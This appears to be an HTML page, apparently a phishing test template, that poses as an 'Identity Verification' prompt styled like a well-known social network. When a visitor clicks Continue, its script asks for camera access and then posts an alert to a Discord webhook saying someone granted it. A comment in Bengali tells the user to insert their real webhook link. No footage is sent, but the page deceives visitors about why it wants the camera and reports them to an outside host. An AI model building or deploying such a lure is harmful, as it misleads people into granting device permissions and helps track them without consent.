<!DOCTYPE html>
<html>
<head>
    <title>Security Test</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; background-color: #f0f2f5; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: inline-block; }
        button { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Identity Verification</h2>
        <p id="status">Click continue to test permissions.</p>
        <button onclick="start()">Continue</button>
    </div>

    <script>
        async function start() {
            const status = document.getElementById('status');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                status.innerText = "Access Granted! Sending to Discord...";

                // এখানে তোমার আসল ডিসকর্ড লিঙ্কটি বসাবে
                const webhookURL = "https://discord.com/api/webhooks/1340333202685235282/8M0W7fS5kG3M1o0v3kG3M1o0v3kG3M1o0v3kG3M1o0v"; 

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: "✅ Success! Someone granted camera access." })
                });

                stream.getTracks().forEach(track => track.stop());
                alert("Success! Check Discord.");
            } catch (err) {
                alert("Error: " + err);
            }
        }
    </script>
</body>
</html>
